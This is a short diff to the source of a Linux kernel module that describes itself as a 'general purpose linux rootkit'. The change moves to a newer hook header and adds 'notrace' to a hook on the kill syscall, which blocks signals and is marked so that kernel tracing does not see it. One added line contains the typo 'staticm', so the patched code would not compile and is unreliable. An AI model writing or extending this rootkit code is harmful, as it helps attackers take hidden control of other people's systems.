@@ -1,16 +1,16 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include "hook_v5.h"
+#include "hook_v6.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("0xwillow");
 MODULE_DESCRIPTION("general purpose linux rootkit");
 MODULE_VERSION("1.0");
 
-static asmlinkage int (*orig_kill) (const struct pt_regs *);
+staticm notrace asmlinkage int (*orig_kill) (const struct pt_regs *);
 
-asmlinkage int hook_kill(const struct pt_regs *regs) {
+asmlinkage notrace int hook_kill(const struct pt_regs *regs) {
     pr_info("debug: hooked kill :D\n");
     return 0;
     // return orig_kill(regs);
